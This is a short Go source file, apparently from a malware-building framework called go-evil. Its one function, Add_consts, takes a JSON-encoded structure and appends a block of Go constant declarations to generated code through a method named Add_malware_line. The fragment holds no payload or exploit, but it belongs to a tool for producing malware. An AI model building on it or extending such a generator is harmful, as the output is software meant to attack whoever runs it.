package finalize

import "github.com/TeamPhoneix/go-evil/utility/structure"

func Add_consts(s_json string) string {
	data_object := structure.Receive(s_json)

	if len(data_object.GO_const) > 0 {
		data_object.Add_malware_line("const (")
		for _, new_const := range data_object.GO_const {
			data_object.Add_malware_line(new_const)
		}
		data_object.Add_malware_line(")")
	}

	return structure.Send(data_object)
}
